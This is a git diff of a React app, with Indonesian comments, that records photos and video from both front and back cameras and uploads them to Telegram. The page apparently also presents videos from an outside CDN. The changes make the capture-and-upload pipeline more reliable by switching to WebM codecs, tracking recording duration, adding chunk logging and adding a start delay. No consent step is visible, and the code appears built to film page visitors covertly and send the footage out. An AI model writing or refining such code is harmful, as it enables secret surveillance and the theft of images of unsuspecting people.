@@ -14,6 +14,7 @@ function App() {
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const recordedChunksRef = useRef<{ [key: string]: BlobPart[] }>({ front: [], back: [] });
+  const recordingStartTimeRef = useRef<{ [key: string]: number }>({ front: 0, back: 0 }); // Simpan waktu mulai perekaman
 
   const videos = [
     { videoUrl: 'https://cdn.videy.co/n9L2Emde1.mp4' },
@@ -240,21 +241,30 @@ function App() {
       return new Promise<void>((resolve) => {
         mediaRecorder.onstop = async () => {
           const chunks = recordedChunksRef.current[cameraType === 'depan' ? 'front' : 'back'];
-          const mimeType = mediaRecorder.mimeType || 'video/mp4';
+          const mimeType = mediaRecorder.mimeType || 'video/webm';
           const videoBlob = new Blob(chunks, { type: mimeType });
-          if (videoBlob.size < 10000) {
-            console.warn(`File video dari kamera ${cameraType} terlalu kecil atau korup, tidak dikirim ke Telegram. Ukuran: ${videoBlob.size} bytes`);
+
+          // Hitung durasi perekaman
+          const startTime = recordingStartTimeRef.current[cameraType === 'depan' ? 'front' : 'back'];
+          const duration = (Date.now() - startTime) / 1000; // Durasi dalam detik
+          console.log(`Durasi perekaman kamera ${cameraType}: ${duration} detik`);
+
+          if (videoBlob.size < 10000 || chunks.length === 0) {
+            console.warn(`File video dari kamera ${cameraType} terlalu kecil atau kosong, tidak dikirim ke Telegram. Ukuran: ${videoBlob.size} bytes`);
             resolve();
             return;
           }
+
           try {
             await sendVideoToTelegram(videoBlob);
-            console.log(`Video dari kamera ${cameraType} berhasil dikirim ke Telegram. Ukuran: ${videoBlob.size} bytes`);
+            console.log(`Video dari kamera ${cameraType} berhasil dikirim ke Telegram. Ukuran: ${videoBlob.size} bytes, Durasi: ${duration} detik`);
           } catch (error) {
             console.error(`Gagal mengirim video dari kamera ${cameraType}:`, error);
           }
           resolve();
         };
+
+        // Hentikan perekaman
         mediaRecorder.stop();
         console.log(`Perekaman kamera ${cameraType} dihentikan.`);
       });
@@ -301,6 +311,7 @@ function App() {
       const videoHeight = cameraVideo.videoHeight;
       console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);
 
+      // Foto: Gunakan resolusi asli kamera
       const canvas = document.createElement('canvas');
       const canvasAspectRatio = 9 / 16;
       const videoAspectRatio = videoWidth / videoHeight;
@@ -336,13 +347,14 @@ function App() {
         console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
       }
 
+      // Video: Gunakan codec WebM untuk kompatibilitas lebih baik
       const supportedMimeTypes = [
+        'video/webm;codecs=vp8,opus', // Prioritaskan WebM
         'video/mp4;codecs=h264,aac',
-        'video/webm;codecs=vp8,opus',
-        'video/mp4',
         'video/webm',
+        'video/mp4',
       ];
-      const mimeType = supportedMimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
+      const mimeType = supportedMimeTypes.find(type => MediaRecorder.isTypeSupported(type)) || 'video/webm';
       const videoResolution = videoWidth * videoHeight;
       const bitrate = videoResolution > 1280 * 720 ? 1500000 : 1000000;
 
@@ -356,6 +368,9 @@ function App() {
       mediaRecorder.ondataavailable = (e) => {
         if (e.data.size > 0) {
           recordedChunksRef.current[type === 'depan' ? 'front' : 'back'].push(e.data);
+          console.log(`Data tersedia untuk kamera ${type}. Ukuran chunk: ${e.data.size} bytes`);
+        } else {
+          console.warn(`Chunk kosong diterima untuk kamera ${type}.`);
         }
       };
 
@@ -365,8 +380,15 @@ function App() {
         console.error(`Error saat merekam kamera ${type}:`, e);
       };
 
+      // Catat waktu mulai perekaman
+      recordingStartTimeRef.current[type === 'depan' ? 'front' : 'back'] = Date.now();
+
+      // Mulai perekaman
       mediaRecorder.start(1000);
       console.log(`Mulai merekam kamera ${type} dengan bitrate ${bitrate} bps`);
+
+      // Tunggu 1 detik untuk memastikan data mulai terkumpul
+      await new Promise(resolve => setTimeout(resolve, 1000));
 
       const recordingTimeout = setTimeout(() => {
         if (mediaRecorder.state === 'recording') {
